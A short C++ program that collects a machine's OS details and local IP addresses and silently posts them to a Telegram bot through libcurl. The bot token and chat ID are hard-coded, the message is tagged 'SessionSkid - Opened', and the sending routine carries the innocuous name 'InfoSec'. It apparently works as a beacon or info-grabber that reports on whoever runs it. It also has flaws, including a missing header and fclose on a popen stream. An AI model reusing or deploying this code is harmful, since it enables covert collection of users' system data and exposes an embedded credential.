#include <iostream>
#include <string>
#include <curl/curl.h>
#include <sys/types.h>
#include <sys/sysctl.h>
#include <unistd.h>
#include <sstream>
#include <iomanip>
#include <fstream>
#include <thread>

#ifdef _WIN32
#include <windows.h>
#include <iphlpapi.h>
#pragma comment(lib, "iphlpapi.lib")
#endif

struct TelegramBotConfig {
    std::string token;
    std::string chatID;
};

size_t WriteCallback(void* contents, size_t size, size_t nmemb, void* userp) {
    ((std::string*)userp)->append((char*)contents, size * nmemb);
    return size * nmemb;
}

bool sendTelegramMessage(const TelegramBotConfig& botConfig, const std::string& message) {
    CURL* curl;
    CURLcode res;

    curl_global_init(CURL_GLOBAL_DEFAULT);
    curl = curl_easy_init();
    if (!curl) {
        curl_global_cleanup();
        return false;
    }

    std::string url = "https://api.telegram.org/bot" + botConfig.token + "/sendMessage";
    std::string postFields = "chat_id=" + botConfig.chatID + "&text=" + curl_easy_escape(curl, message.c_str(), message.length());

    curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, postFields.c_str());

    std::string response;
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);

    res = curl_easy_perform(curl);
    if (res != CURLE_OK) {
        curl_easy_cleanup(curl);
        curl_global_cleanup();
        return false;
    }

    long responseCode;
    curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &responseCode);
    curl_easy_cleanup(curl);
    curl_global_cleanup();

    return responseCode == 200;
}

std::string getSystemInfo() {
    std::ostringstream ss;
#ifdef _WIN32
    SYSTEM_INFO siSysInfo;
    GetSystemInfo(&siSysInfo);
    ss << "CPU Architecture: " << (siSysInfo.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_INTEL ? "x86" : "x64") << "\n";
    MEMORYSTATUSEX statex;
    statex.dwLength = sizeof(statex);
    GlobalMemoryStatusEx(&statex);
    ss << "Physical Memory: " << statex.ullTotalPhys / (1024 * 1024) << " MB\n";
#else
    struct utsname buffer;
    if (uname(&buffer) == 0) {
        ss << "System: " << buffer.sysname << "\n";
        ss << "Node: " << buffer.nodename << "\n";
        ss << "Release: " << buffer.release << "\n";
        ss << "Version: " << buffer.version << "\n";
        ss << "Machine: " << buffer.machine << "\n";
    }
#endif
    return ss.str();
}

std::string getLocalIPs() {
    std::string ipv4 = "Not Available";
    std::string ipv6 = "Not Available";

#ifdef _WIN32
    IP_ADAPTER_INFO adapterInfo[16];
    DWORD dwBufLen = sizeof(adapterInfo);
    DWORD dwStatus = GetAdaptersInfo(adapterInfo, &dwBufLen);
    if (dwStatus == ERROR_SUCCESS) {
        for (PIP_ADAPTER_INFO pAdapter = adapterInfo; pAdapter != nullptr; pAdapter = pAdapter->Next) {
            if (pAdapter->IpAddressList.IpAddress.String) {
                ipv4 = pAdapter->IpAddressList.IpAddress.String;
                break;
            }
        }
    }
#else
    FILE* fp = popen("hostname -I", "r");
    if (fp != nullptr) {
        char buffer[128];
        if (fgets(buffer, sizeof(buffer), fp) != nullptr) {
            ipv4 = std::string(buffer);
        }
        fclose(fp);
    }
#endif
    return "IPv4: " + ipv4 + "\nIPv6: " + ipv6;
}

void InfoSec() {
    TelegramBotConfig botConfig = {"8071494016:AAHLA2ZOCkdjsryBKjFfUmP5BJzDdem_F8Q", "6006471602"};
    std::ostringstream message;
    message << "===============================\n"
            << "SessionSkid\n- Opened: " << std::time(0) << "\n"
            << getLocalIPs() << "\n"
            << getSystemInfo();

    if (!sendTelegramMessage(botConfig, message.str())) {
        std::cerr << "Failed to send message\n";
    }
}

int main() {
    InfoSec();
    return 0;
}
